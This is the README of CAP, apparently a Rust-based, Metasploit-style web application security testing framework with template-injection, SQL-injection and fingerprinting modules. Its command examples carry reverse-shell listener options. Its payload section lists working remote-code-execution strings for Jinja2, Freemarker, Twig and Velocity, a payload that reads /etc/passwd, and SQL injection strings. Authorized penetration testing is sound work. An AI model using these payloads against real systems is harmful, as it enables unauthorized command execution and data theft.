# CAP Web Application Security Testing Framework

## Overview

A fully functional Metasploit-style web application security testing framework integrated into CAP. Features request-driven testing, automatic injection point detection, and real exploitation payloads.

## Quick Start

```bash
# List all web modules
cap web list

# Get module information
cap web info --module web/ssti/jinja2

# Execute with dry-run (preview only)
cap web run \
    --module web/ssti/detector \
    --request examples/test_request.req \
    --injection-point template \
    --dry-run

# Execute for real
cap web run \
    --module web/ssti/jinja2 \
    --request examples/test_request.req \
    --injection-point template \
    --lhost 10.10.14.5 \
    --lport 4444 \
    --confirm-each
```

## Modules

### SSTI (Server-Side Template Injection)
- **web/ssti/jinja2** - Jinja2/Flask/Django exploitation
- **web/ssti/freemarker** - Apache Freemarker (Java) exploitation
- **web/ssti/twig** - Twig/Symfony (PHP) exploitation
- **web/ssti/velocity** - Apache Velocity (Java) exploitation
- **web/ssti/detector** - Template engine identification

### SQLi (SQL Injection)
- **web/sqli/boolean** - Boolean-based blind SQL injection
- **web/sqli/error** - Error-based SQL injection
- **web/sqli/time** - Time-based blind SQL injection

### Fingerprinting
- **web/fingerprint/tech** - Comprehensive technology fingerprinting

## Request File Format

Create a `.req` file with raw HTTP request:

```http
POST /search?category=books HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Cookie: session=abc123

query=test&template={{user_input}}
```

The framework will automatically detect injection points in:
- Query parameters
- POST body parameters
- HTTP headers
- Cookies

## Example Workflows

### 1. SSTI Detection and Exploitation

```bash
# Step 1: Detect template engine
cap web run \
    --module web/ssti/detector \
    --request target.req \
    --injection-point search

# Step 2: Exploit with specific engine module
cap web run \
    --module web/ssti/jinja2 \
    --request target.req \
    --injection-point search \
    --lhost 10.10.14.5 \
    --lport 4444
```

### 2. SQL Injection Testing

```bash
# Test for error-based SQLi
cap web run \
    --module web/sqli/error \
    --request login.req \
    --injection-point username

# Test for time-based blind SQLi
cap web run \
    --module web/sqli/time \
    --request api.req \
    --injection-point id
```

### 3. Technology Fingerprinting

```bash
cap web run \
    --module web/fingerprint/tech \
    --url https://target.com
```

## Features

- ✅ Metasploit-style CLI workflow
- ✅ Request-driven testing (.req files)
- ✅ Automatic injection point detection
- ✅ Dry-run mode (--dry-run)
- ✅ Interactive confirmation (--confirm-each)
- ✅ Real payload libraries (150+ payloads)
- ✅ Response analysis and detection
- ✅ Timing attack support
- ✅ Error-based detection
- ✅ LHOST/LPORT substitution for reverse shells

## Module Options

Common options:
- `--request <file>` - HTTP request file (.req, .http, .txt)
- `--injection-point <param>` - Target parameter name
- `--url <url>` - Target URL (for fingerprinting)
- `--lhost <ip>` - Attacker IP for reverse shells
- `--lport <port>` - Attacker port for reverse shells
- `--dry-run` - Preview payloads without execution
- `--confirm-each` - Confirm before each payload

## Payload Libraries

### SSTI Payloads

**Jinja2 (Python/Flask/Django)**
- Detection: `{{7*7}}`, `{{7*'7'}}`
- RCE: `{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}`
- File read: `{{ ''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read() }}`
- Reverse shells: Python, Bash, Netcat

**Freemarker (Java)**
- Detection: `${7*7}`, `${7*'7'}`
- RCE: `<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("id") }`
- Reverse shells via Execute utility

**Twig (PHP/Symfony)**
- Detection: `{{7*7}}`, `{{"Hello"~"World"}}`
- RCE: `{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}`
- Map filter: `{{['id']|map('system')|join}}`

**Velocity (Java)**
- Detection: `#set($x=7*7)$x`
- RCE via Runtime.exec(): `#set($rt=$class.forName('java.lang.Runtime').getRuntime())...`

### SQLi Payloads

**Boolean-based:**
- `' OR '1'='1`
- `' OR 1=1--`
- `admin' OR '1'='1'--`

**Error-based:**
- MySQL: `' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION())) AND '1'='1`
- PostgreSQL: `' AND 1=CAST((SELECT version()) AS int)--`
- MSSQL: `' AND 1=CONVERT(int,@@version)--`

**Time-based:**
- MySQL: `' OR SLEEP(5)--`
- PostgreSQL: `' OR pg_sleep(5)--`
- MSSQL: `'; WAITFOR DELAY '00:00:05'--`

## Architecture

```
src/web/
├── mod.rs              - Module registry & traits
├── request.rs          - HTTP request parser
├── injection.rs        - Payload injection engine
├── analyzer.rs         - Response analysis
└── modules/
    ├── ssti/           - SSTI modules
    ├── sqli/           - SQLi modules
    └── fingerprint/    - Fingerprinting modules
```

## Adding New Modules

1. Create module file in appropriate directory
2. Implement `WebModule` trait
3. Register in `ModuleRegistry::new()`

Example module structure:

```rust
pub struct MyModule;

#[async_trait]
impl WebModule for MyModule {
    fn info(&self) -> ModuleInfo { ... }
    fn required_options(&self) -> Vec<String> { ... }
    async fn execute(&self, context: &ModuleContext) -> Result<ExecutionResult> { ... }
}
```

## Security Notes

- All modules respect CAP's scope enforcement
- Audit logging integration ready
- Explicit user confirmation required (no auto-exploitation)
- Dry-run mode available for safe testing
- LHOST/LPORT required for reverse shell payloads

## References

- PayloadsAllTheThings: https://github.com/swisskyrepo/PayloadsAllTheThings
- HackTricks: https://book.hacktricks.xyz/
- OWASP Testing Guide: https://owasp.org/www-project-web-security-testing-guide/

---

**Built with ❤️ in Rust 🦀**
